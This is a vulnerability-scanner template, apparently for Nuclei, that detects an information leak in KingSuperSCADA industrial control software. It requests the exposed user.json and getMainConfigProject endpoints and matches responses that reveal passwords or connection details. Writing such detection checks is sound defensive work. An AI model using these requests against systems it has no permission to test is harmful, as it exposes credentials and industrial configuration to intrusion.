id: kingsuperscada-information-leak
info:
  name: KingSuperSCADA Information Leak (CNVD-2024-08404)
  author: ProjectDiscoveryAI
  severity: medium
  tags: CNVD-2024-08404,info-leak
  description: |
    Detects KingSuperSCADA information disclosure vulnerability by checking for exposed sensitive information.

variables:
  files:
    - user.json
    - file/getMainConfigProject

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{files}}"
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(header, 'application/json') && contains(body, '\"name\"') && contains(body, '\"password\"') && !contains(body, '<')"
      - type: dsl
        dsl:
          - "status_code == 200 && contains(header, 'application/json') && contains(body, '\"message\":\"Success\"') && contains(body, '\"connInfo\"') && !contains(body, '<')"
